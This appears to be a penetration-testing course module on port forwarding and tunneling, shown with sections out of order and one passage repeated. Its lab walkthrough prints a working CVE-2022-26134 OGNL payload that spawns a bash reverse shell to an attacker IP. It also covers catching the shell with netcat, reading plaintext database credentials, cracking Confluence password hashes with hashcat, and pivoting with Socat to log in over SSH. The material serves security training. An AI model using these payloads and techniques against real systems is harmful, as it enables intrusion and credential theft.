10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
